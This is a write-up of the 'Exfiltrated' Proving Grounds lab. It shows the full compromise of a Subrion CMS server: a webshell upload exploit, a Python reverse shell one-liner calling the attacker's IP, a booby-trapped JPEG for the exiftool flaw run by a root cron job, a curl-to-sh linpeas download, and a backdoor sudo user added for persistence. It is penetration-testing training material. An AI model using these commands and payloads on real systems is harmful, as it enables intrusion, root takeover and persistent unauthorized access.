# Exfiltrated

> Note: this one was **not** easy... The community rated this as intermediate - I would too, took me long mostly due to the exploit code I got from exploit-db not working as expected (and doubting that I had found the right vector).

### Contents
- [Set-up](#set-up)
- [Discovery](#discovery)
- [Access](#access)
- [Privilege Escalation](#privilege-escalation)
- [Persistence (Bonus)](#persistence-bonus)
- [Moar...](#moar)

## Set-up

1) Ran a `sudo apt-get update`

2) Added target `192.168.51.163` as `target` to `/etc/hosts`

## Discovery

3) Scanning the target for open ports with `nmap -v -p- -T4 target`. Results:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

4) Figerprinting the two open ports with `nmap -v -p 22,80 -T4 -A target` yields results:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 09BDDB30D6AE11E854BFF82ED638542B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

5) Checking out the webserver in Firefox just redirects us to http://exfiltrated.offsec, and there's nothing there...

6) Hitting the webserver with cURL (to get headers, cookies) gives us:

```
??$ curl http://target -v
*   Trying 192.168.51.163:80...
* Connected to target (192.168.51.163) port 80
> GET / HTTP/1.1
> Host: target
> User-Agent: curl/8.4.0
> Accept: */*
> 
< HTTP/1.1 302 Found
< Date: Mon, 26 Feb 2024 21:39:23 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Set-Cookie: INTELLI_06c8042c3d=f1lv0e3816c3j3jpkfmvna1r48; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Set-Cookie: INTELLI_06c8042c3d=f1lv0e3816c3j3jpkfmvna1r48; expires=Mon, 26-Feb-2024 22:09:23 GMT; Max-Age=1800; path=/
< Location: http://exfiltrated.offsec/
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host target left intact
```

Not much to work with, looked up "INTELLI" (prefix in the cookie) to see if that could indicate what the running service is... no luck.

6) At this point the next things to try are:

- enumerating directories in the webserver with `gobuster`/`dirbuster`
- seraching (with `searchsploit`) for exploits in 

7) Enumerating directories with `gobuster` (excluding redirect status codes):

<details>

<summary>`gobuster` output</summary>

```
??$ gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,301,302
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,301,302
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/updates              (Status: 403) [Size: 271]
/server-status        (Status: 403) [Size: 271]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

</details>

Most endpoints just redirected to the same path behind `http://exfiltrated.offsec`, some just returned 403...

8) Going back to the output from `nmap` -- it does have some entries that `gobuster` did not find...:

- /backup/
- /cron/?
- /front/
- /install/
- /panel/
- /tmp/ 
- _/updates/

Trying all of them manually -- `/panel/` gives us a login screen!

![](./assets/subrion-login.png)

From here we note that there are a few things to try now:

- Try default credentials e.g. `admin:admin`
- Look-up "Subrion CMS v4.2.1" with `searchsploit`

## Access

9) Of course, `admin:admin` works for the login screen. Before moving on, I'll look up subrion in exploit-db (with `searchsploit`)... best case scenario we see an RCE exploit we can use with admin creds.

<details>

<summary>`searchsploit` output</summary>

```
--$ searchsploit subrion
---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                          |  Path
---------------------------------------------------------------------------------------- ---------------------------------
Subrion 3.x - Multiple Vulnerabilities                                                  | php/webapps/38525.txt
Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                                 | php/webapps/47469.txt
Subrion Auto Classifieds - Persistent Cross-Site Scripting                              | php/webapps/14391.txt
SUBRION CMS - Multiple Vulnerabilities                                                  | php/webapps/17390.txt
Subrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin)                              | php/webapps/21267.txt
subrion CMS 2.2.1 - Multiple Vulnerabilities                                            | php/webapps/22159.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)                              | php/webapps/47851.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Persistent Cross-Site Scripting | php/webapps/40553.txt
Subrion CMS 4.0.5 - SQL Injection                                                       | php/webapps/40202.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                                                  | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                                               | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                        | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                                                | php/webapps/45150.txt
Subrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)                                   | php/webapps/51110.txt
---------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

</details>

Looks like we have plenty of things to try! Filtering for `4.2.1` we get:

<details>

<summary>`searchsploit` output</summary>

```
??$ searchsploit subrion 4.2.1
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting             | php/webapps/47469.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                              | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                           | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)    | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                            | php/webapps/45150.txt
Subrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)               | php/webapps/51110.txt
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

</details>

My money is on the "Arbitrary File Upload" exploit... I bet we can upload a reverse shell in PHP and get it to call home (to our Kali machine).

10) From inspecting the exploit source code ([available here](https://www.exploit-db.com/exploits/49876)) we see that the exploit actually does a lot of the heavy lifting for us including uploading a reverse shell and catching it locally... Let's try running it:

> I spent a long time here because the exploit wouldn't be able to authenticate - even though I could manually via the web UI... the problem was: I was giving it url `http://target/panel`, and it needed a trailing slash e.g. `http://target/panel/`...

```
???(kali?kali)-[~/Desktop]
??$ python /usr/share/exploitdb/exploits/php/webapps/49876.py --url=http://target/panel/ --user=admin --passw=admin
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://target/panel/
[+] Success!
[+] Got CSRF token: LImitLsPH5nNMNQ8rAMS1WJjP0EO0bT2uoEnPaJJ
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: vbcokywhgxcdfkt

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://target/panel/uploads/vbcokywhgxcdfkt.phar 

$ whoami
www-data
```

We have a shell! Now we need a root shell...

## Privilege Escalation

11) First thing to do is enumerate system users... i.e. `cat /etc/passwd`.

```
(... omitted for brevity)

root:x:0:0:root:/root:/bin/bash
coaran:x:1000:1000::/home/coaran:/bin/bash
```
i
Lots of users but 2 of them have shells: root and coaran.

12) Next thing to do is run `getcap -r / 2>/dev/null` if that gets us nowhere, then we try LinPEAS...

```
$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

Nothing.... let's try LinPEAS.

13) We download LinPeas and pipe it straight to a shell:

```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

(tool a long time sifting through the results)

Under the Cron jobs section of the results:

```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
```

There's a script that runs constantly (as root) `/opt/image-exif.sh`, perhaps we can modify the script to escalate ourselves:

```
$ ls -la /opt
total 16
drwxr-xr-x  3 root root 4096 Jun 10  2021 .
drwxr-xr-x 20 root root 4096 Jan  7  2021 ..
-rwxr-xr-x  1 root root  437 Jun 10  2021 image-exif.sh
drwxr-xr-x  2 root root 4096 Jun 10  2021 metadata
```

We can't modify it (don't have the right file permissions)... but let's take a look at what it does, maybe we can abuse it to get root...

```
$ cat /opt/image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

Looks like it reads files from `/var/www/html/subrion/uploads` and trusts that they are safe to process with `exiftool`, a metadata reader that supports multiple file formats ([docs](https://exiftool.org/)). Maybe there is an exploit in exiftool we can take advantage of.

14) We look-up exiftool with `searchsploit`:

<details>

<summary>`searchsploit` output</summary>

```
??$ searchsploit exiftool     
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
ExifTool 12.23 - Arbitrary Code Execution                                         | linux/local/50911.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

</details>

There is an arbitrary code execution exploit for at least version 12.23... time to check the version of `exiftool`. A quick google search tells me I can run `exiftool -ver`:

```
$ exiftool -ver
11.88
```

Looked up CVE associated with the available exploit (CVE-2021-22204) and found that the vulnerability affects `exiftool` versions between 7.44 and 12.23. Look at that... now we're cooking!

15) I run the exploit code in Kali to get usage:

```
--$ python /usr/share/exploitdb/exploits/linux/local/50911.py 
UNICORD Exploit for CVE-2021-22204

Usage:
  python3 exploit-CVE-2021-22204.py -c <command>
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port>
  python3 exploit-CVE-2021-22204.py -c <command> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -h

Options:
  -c    Custom command mode. Provide command to execute.
  -s    Reverse shell mode. Provide local IP and port.
  -i    Path to custom JPEG image. (Optional)
  -h    Show this help menu.

```

So it looks like we can feed this thing arbitrary commands and it will output a JPEG which would result in `exiftool` executing the commands. The script from the cron job reads files with filename containing the substring `jpg` from `/var/www/html/subrion/uploads`...

So we should be able to:

- a) feed this exploit script a reverse shell
- b) set up a local listener in our attacker machine (Kali)
- b) put the output JPEG in `/var/www/html/subrion/uploads` with a `.jpg` file extension
- d) wait to catch the shell in the local listener from (b)

16) First I'll test the reverse shell I plan to feed the exploit code...

16.1) We set up a listener on port 80 in Kali with `nc -lvnp 80`

16.2) We then run the reverse shell as the low-privilege user in the victim box:

```
$ python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.51\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
```

16.3) We see we got a shell in Kali

```
--$ nc -vlnp 80
listening on [any] 80 ...
connect to [192.168.49.51] from (UNKNOWN) [192.168.51.163] 38646
www-data@exfiltrated:/var/www/html/subrion/uploads$ whoami
whoami
www-data
www-data@exfiltrated:/var/www/html/subrion/uploads$ echo hello world!
echo hello world!
hello world!
www-data@exfiltrated:/var/www/html/subrion/uploads$ 
```

Great, now we can move on to leverage the `exiftool` vulnerability exploit. To recap, the plan is: get the cron job (which runs exiftool, as root) to run the reverse shell code and get us a shell as `root`.

17) We build our payload JPEG:

> Note: First pass the python program crapped out because the system didnt have a binary `bzz`, had to run `sudo apt-get install djvulibre-bin -y`)

```
---(kali?kali)-[~]
--$ python /usr/share/exploitdb/exploits/linux/local/50911.py -c 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.51\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
RUNNING: UNICORD Exploit for CVE-2021-22204
PAYLOAD: (metadata "\c${system('python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.51\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"')};")
RUNTIME: DONE - Exploit image written to 'image.jpg'
```

18) Now we just need to move our payload from the Kali file-system to the target host. We can do this by setting up an HTTP server (python has a built-in file server) in the Kali machine and simply downloading it from the target host (e.g. with cURL or wget)...

In Kali:

> I moved the `image.jpg` payload into a directory `~/server`, where I started my server

```
---(kali?kali)-[~/server]
--$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.51.163 - - [27/Feb/2024 01:28:44] "GET /image.jpg HTTP/1.1" 200 -
```

In the Victim Host:

> Note how I downloaded the file as `notbad`. This is because I didn't want it to get picked up by the `exiftool` cron job just yet (I don't have a listener yet and I want to re-use port 80 just in case there is a firewall in place).

```
$ pwd
/var/www/html/subrion/uploads

$ wget -O notbad http://192.168.49.51/image.jpg

$ ls -la | grep notbad
-rw-r--r--  1 www-data www-data  465 Feb 27 01:24 notbad
```

19) Next we set up our listener in Kali and rename the file to have a `.jpg` file extension (and hope it get's picked up by the cron job soon!)

In Kali:

```
??$ nc -vlnp 80
listening on [any] 80 ...
```

In the Victim Host:

```
$ mv notbad notbad.jpg
```

20) Nothing happened after a while. I noticed the cron job script writes results to a readable location, so I went snooping to make sure the file was processed:

<details>

<summary>most recent output file / log file for the cron job script</summary>

```
$ ls -la /opt/metadata
total 16
drwxr-xr-x 2 root root 4096 Feb 27 01:35 .
drwxr-xr-x 3 root root 4096 Jun 10  2021 ..
-rw-r--r-- 1 root root 1335 Feb 27 01:35 127b468941
-rw-r--r-- 1 root root 1335 Feb 27 01:34 ca275c66d8

$ cat /opt/metadata/127b468941
ExifTool Version Number         : 11.88
File Name                       : notbad.jpg
Directory                       : /var/www/html/subrion/uploads
File Size                       : 465 bytes
File Modification Date/Time     : 2024:02:27 01:24:33+00:00
File Access Date/Time           : 2024:02:27 01:34:01+00:00
File Inode Change Date/Time     : 2024:02:27 01:33:03+00:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Exif Byte Order                 : Big-endian (Motorola, MM)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
DjVu Version                    : 0.24
Spatial Resolution              : 300
Gamma                           : 2.2
Orientation                     : Horizontal (normal)
Warning                         : Ignored invalid metadata entry(s)
Image Width                     : 1
Image Height                    : 1
Encoding Process                : Extended sequential DCT, arithmetic coding
Bits Per Sample                 : 8
Color Components                : 1
Image Size                      : 1x1
Megapixels                      : 0.000001
```

</details>

So our exploit image was processed... but we didn't get a shell despite knowing for certain that the python reverse shell worked when running it as non-root. The exploit software must've gone wrong. Looks like we'll have to "try harder"...

21) I tried it a couple more times, still to no avail. Strange... the exiftool version is definitely vulnerable, and the exploit code runs without errors and produces a `.jpg`... Time to dig into the code...

Spent about an hour reading and tweaking the code with no results. Will try the top result for "CVE-2021-22204 github" on google --> https://github.com/mr-tuhin/CVE-2021-22204-exiftool

22) I clone the repo, install dependencies as per the README.md there (e.g. first linux packages, then python packages with pip3). I run the program:

```
---(kali?kali)-[~/attempt-2/CVE-2021-22204-exiftool]
--$ python3 exploit.py 192.168.49.51 80

#################################################################
#       Author: Tuhin SG                                        #
#       Date: 2022-02-21                                        #
#       Github: https://github.com/tuhin81                      #
#       Web-site: https://tech-root.epizy.com?pgi=blog&pbgi=1   #
#       OS: Linux system                                        #
#       Vesion: 1.0                                             #
#################################################################
                                                                                                                                                                                                                                                                                       
---(kali?kali)-[~/attempt-2/CVE-2021-22204-exiftool]
--$ ls
README.md  exploit.py  image.jpg  requirements.txt
```

Looks like an image.jpg was generated, as per the docs.

23) I set up my local listener again (`nc -lvnp 80`) and I move that file to the target machine by setting up a local webserver with python e.g. `python -m http.server 81`, and I use `wget` on the victim host to fetch it hoping to see an as-root shell on my listener terminal window...

```
---(kali?kali)-[~/Desktop/exploits]
--$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.51] from (UNKNOWN) [192.168.51.163] 57284
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# echo omgggggg
omgggggg
# ls -la
total 28
drwx------  4 root root 4096 Feb 27 05:02 .
drwxr-xr-x 20 root root 4096 Jan  7  2021 ..
lrwxrwxrwx  1 root root    9 Jun 10  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rwx------  1 root root   33 Feb 27 05:02 proof.txt
drwxr-xr-x  3 root root 4096 Jan  7  2021 snap
drwx------  2 root root 4096 Jan  7  2021 .ssh
# cat proof.txt
0fbdfad7c6331c664848786d12cc1d9f
```

Success! At last!


## Bonus (Persistence)

24) The usual... setting up a new linux user to walk through the front door via SSH:

```
# sudo useradd -m backdoor

# echo backdoor:hackerman | sudo chpasswd

# sudo usermod -aG sudo backdoor

# cat /etc/ssh/sshd_config | grep PasswordAuthentication
#PasswordAuthentication yes
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication, then enable this but set PasswordAuthentication
PasswordAuthentication yes
```

> Note that PasswordAuthentication was already enabled, so we didn't have to change the config nor restart the ssh server!

25) Testing access via ssh, and verifying we can become root:

```
---(kali?kali)-[~/attempt-2/CVE-2021-22204-exiftool]
--$ ssh backdoor@target                    
The authenticity of host 'target (192.168.51.163)' can't be established.
ED25519 key fingerprint is SHA256:D9EwlP6OBofTctv3nJ2YrEmwQrTfB9lLe4l8CqvcVDI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
backdoor@target's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 27 Feb 2024 05:39:14 AM UTC

  System load:  0.0               Processes:               213
  Usage of /:   54.1% of 9.78GB   Users logged in:         0
  Memory usage: 33%               IPv4 address for ens160: 192.168.51.163
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ sudo whoami
[sudo] password for backdoor: 
root
```

## Moar...

After wrapping up the write-up I noticed that proving grounds only have me 50% of the credit. I went back into the victim box through SSH and found that there was another user with a `local.txt` file in their home directory which had the flag for the other 50%:

```
$ sudo ls -la coaran
total 24
drwx--x--x 2 coaran coaran 4096 Jun 10  2021 .
drwxr-xr-x 4 root   root   4096 Feb 27 05:37 ..
lrwxrwxrwx 1 root   root      9 Jun 10  2021 .bash_history -> /dev/null
-rw-r--r-- 1 coaran coaran  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 coaran coaran 3771 Feb 25  2020 .bashrc
-rwxr--r-- 1 coaran coaran   33 Feb 27 05:02 local.txt
-rw-r--r-- 1 coaran coaran  807 Feb 25  2020 .profile
$ sudo cat coaran/local.txt
3d429a124c421a5c41193db8425788db
```